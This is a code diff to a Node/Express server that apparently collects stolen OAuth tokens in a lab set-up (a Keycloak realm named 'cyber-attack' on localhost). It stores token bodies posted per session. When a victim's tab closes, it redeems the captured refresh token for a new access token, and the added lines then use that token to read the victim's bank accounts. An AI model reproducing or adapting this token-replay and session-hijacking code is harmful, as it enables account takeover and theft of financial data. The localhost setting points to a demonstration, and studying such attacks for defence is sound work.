@@ -14,7 +14,7 @@ function logWithSessionId(sessionId, ...messages) {
     console.log(`${timestamp} [${sessionId}] -`, ...messages);
 }
 
-async function getNewToken(sessionId, refreshToken) {
+async function fetchNewToken(sessionId, refreshToken) {
     try {
         const response = await fetch("http://localhost:8080/realms/cyber-attack/protocol/openid-connect/token", {
             method: "POST",
@@ -27,16 +27,35 @@ async function getNewToken(sessionId, refreshToken) {
         if (response.ok) {
             const data = await response.json();
             logWithSessionId(sessionId, `Neue Token wurden mit Refresh Token geholt: ${JSON.stringify(data)}`);
+            return data.access_token;
         } else {
             logWithSessionId(sessionId, `Fehler beim Holen neuer Token: ${response.status} ${response.statusText}`);
+            return null;
         }
     } catch (error) {
         logWithSessionId(sessionId, `Fehler beim Anfordern neuer Token: ${error.message}`);
+        return null;
+    }
+}
+
+async function fetchBankAccounts(sessionId, accessToken) {
+    if (accessToken) {
+        fetch('http://localhost:3000/api/accounts', {
+            method: 'GET',
+            headers: {
+                'Authorization': `Bearer ${accessToken}`
+            }
+        })
+            .then(response => response.json())
+            .then(data => logWithSessionId(sessionId, 'Daten von der API:' + data))
+            .catch(err => logWithSessionId(sessionId, 'Fehler beim API-Aufruf:' + err));
+    } else {
+        console.error('Kein Token erhalten');
     }
 }
 
 app.post('/rest/receive-token-body', (req, res) => {
-    const { sessionId, body } = req.body;
+    const {sessionId, body} = req.body;
     tokenRequestsPerSession[sessionId] = body;
 
     logWithSessionId(sessionId, 'Empfangener Token-Body');
@@ -49,7 +68,9 @@ app.post('/rest/tab-closed', (req, res) => {
 
     const refreshToken = tokenRequestsPerSession[sessionId].refresh_token;
     logWithSessionId(sessionId, `Refresh Token: ${refreshToken}`);
-    getNewToken(sessionId, refreshToken);
+    fetchNewToken(sessionId, refreshToken).then(token => {
+        fetchBankAccounts(sessionId, token);
+    });
 });
 
 app.listen(port, () => {
